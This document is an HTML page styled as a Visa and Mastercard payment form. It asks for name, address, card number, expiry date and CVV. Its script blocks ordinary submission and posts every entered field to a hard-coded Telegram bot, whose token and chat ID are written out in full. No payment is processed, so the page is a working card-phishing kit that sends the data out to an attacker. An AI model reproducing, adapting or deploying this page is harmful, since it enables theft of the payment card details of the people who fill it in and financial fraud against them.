<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visa & Mastercard Payment</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
        }
        .payment-form {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
            width: 300px;
        }
        input, select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <form class="payment-form" id="paymentForm">
        <h2>Payment Details</h2>
        <input type="text" name="firstname" placeholder="First Name" autocomplete="given-name">
        <input type="text" name="lastname" placeholder="Last Name" autocomplete="family-name">
        <input type="text" name="address" placeholder="Address" autocomplete="address-line1">
        <input type="text" name="city" placeholder="City" autocomplete="address-level2">
        <input type="text" name="postcode" placeholder="Post Code" autocomplete="postal-code">
        <select name="country">
            <option value="">Select Country</option>
            <option value="Austria">Austria</option>
            <option value="Belgium">Belgium</option>
            <option value="Denmark">Denmark</option>
            <option value="Finland">Finland</option>
            <option value="France">France</option>
            <option value="Germany">Germany</option>
            <option value="Italy">Italy</option>
            <option value="Netherlands">Netherlands</option>
            <option value="Norway">Norway</option>
            <option value="Poland">Poland</option>
            <option value="Spain">Spain</option>
            <option value="Sweden">Sweden</option>
            <option value="Switzerland">Switzerland</option>
            <option value="United Kingdom">United Kingdom</option>
        </select>
        <input type="text" name="cardholder" placeholder="Cardholder Name" autocomplete="cc-name">
        <input type="text" name="cardnumber" placeholder="Card Number" autocomplete="cc-number">
        <input type="text" name="expdate" placeholder="MM/YY" autocomplete="cc-exp">
        <input type="text" name="cvv" placeholder="CVV" autocomplete="cc-csc">
        <button type="submit">Pay Now</button>
    </form>
    
    <script>
        document.getElementById("paymentForm").addEventListener("submit", function(event) {
            event.preventDefault();
            
            let formData = new FormData(this);
            let message = "\u2728 *Payment Details* \u2728\n\n";
            formData.forEach((value, key) => {
                message += `\u2022 *${key.replace(/_/g, ' ').toUpperCase()}*: ${value}\n`;
            });
            
            let botToken = "7432729957:AAE2rvKf8YA4p7DEzuMBYjnpkQJzAqMqbwk";
            let chatId = "5889938125";
            let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            fetch(telegramUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
            });
        });
    </script>
</body>
</html>
